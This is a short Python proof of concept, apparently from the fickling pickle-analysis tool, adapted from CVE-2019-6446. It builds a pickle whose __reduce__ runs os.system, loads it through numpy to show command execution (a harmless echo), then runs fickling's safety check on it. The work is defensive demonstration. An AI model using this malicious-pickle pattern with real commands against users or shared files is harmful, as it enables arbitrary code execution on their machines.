# This PoC has been adapted from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)

import os
import pickle

import numpy

from fickling.fickle import Pickled
import fickling.analysis as analysis 


class Test:
    def __init__(self):
        self.a = 1

    def __reduce__(self):
        return (os.system, ("echo 'Now I can run malicious code! Never trust a pickle.'",))


payload = Test()

print("\n\nWithout fickling\n\n")

with open("a-file.pickle", "wb") as f:
    pickle.dump(payload, f)

# The original PoC used an earlier version where allow_pickle was True by default
numpy.load("a-file.pickle", allow_pickle=True)

print("\n\nWith fickling\n\n")

fickled_payload = Pickled.load(pickle.dumps(payload))

safety_results = analysis.check_safety(fickled_payload).to_dict()

print(safety_results)
